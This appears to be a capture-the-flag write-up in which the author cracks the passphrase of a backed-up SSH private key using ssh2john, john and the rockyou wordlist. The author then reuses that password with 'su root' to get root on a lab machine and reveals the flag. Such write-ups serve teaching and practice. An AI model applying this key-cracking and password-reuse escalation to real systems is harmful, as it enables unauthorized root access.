# Getting the crown jewels

![](https://i.imgur.com/DD4QDOf.png)

- Password spraying is trying the password of one account on all the other account searching for duplicate password across accounts, so from the description, we will probably try to get hype password from the previous challenge and use it to log in into root

- i found a file called id_rsa.bak in `/home/hype/backups/ssh/id_rsa.bak` with a `note.txt` that says `This is a backup of my private key, just in case`

- so let's download the file on our attacker machine and use john the ripper to crack the hash, first we translate it to a form that john understands using ssh2john and then we crack it using the famous wordlist rockyou.txt

```bash
┌──(root💀kali)-[~/Hacking/RCTS/getting_the_crown_jewels]
└─# /usr/share/john/ssh2john.py id_rsa.bak > ssh.hash

┌──(root💀kali)-[~/Hacking/RCTS/getting_the_crown_jewels]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
barcelona1       (id_rsa.bak)
1g 0:00:00:07 DONE (2021-08-11 15:59) 0.1396g/s 2003Kp/s 2003Kc/s 2003KC/sa6_123..*7¡Vamos!
Session completed
```

- look like the password for the id_rsa file is `barcelona1`, lets try `su root` on the shell that we got from the previous challenge

![](https://i.imgur.com/ZZ2Iebm.png)

- it worked :) and now we have our flag

- Flag: flag{h4ck1ng_th3_h4ck3r}